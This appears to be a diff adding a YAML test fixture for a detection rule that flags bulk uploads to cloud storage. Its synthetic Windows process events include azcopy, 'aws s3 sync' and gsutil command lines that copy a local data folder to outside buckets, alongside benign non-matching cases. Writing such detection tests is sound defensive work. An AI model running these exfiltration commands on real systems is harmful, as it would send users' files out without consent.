@@ -1,0 +1,66 @@
+docs:
+- id: azcopy
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: azcopy.exe
+      executable: C:\Windows\System32\azcopy.exe
+      command_line: azcopy copy C:\data https://acct.blob.core.windows.net/c?sv=2024 --recursive
+      parent: {name: explorer.exe}
+- id: aws
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: aws.exe
+      executable: C:\Windows\System32\aws.exe
+      command_line: aws s3 sync C:\data s3://my-bucket
+      parent: {name: explorer.exe}
+- id: gsutil
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: cmd.exe
+      executable: C:\Windows\System32\cmd.exe
+      command_line: cmd /c gsutil cp -r C:\data gs://b
+      parent: {name: explorer.exe}
+- id: aws-ls
+  match: false
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: aws.exe
+      executable: C:\Windows\System32\aws.exe
+      command_line: aws s3 ls
+      parent: {name: explorer.exe}
+- id: download
+  match: false
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: aws.exe
+      executable: C:\Windows\System32\aws.exe
+      command_line: aws s3 cp s3://b/a.txt a.txt
+      parent: {name: explorer.exe}
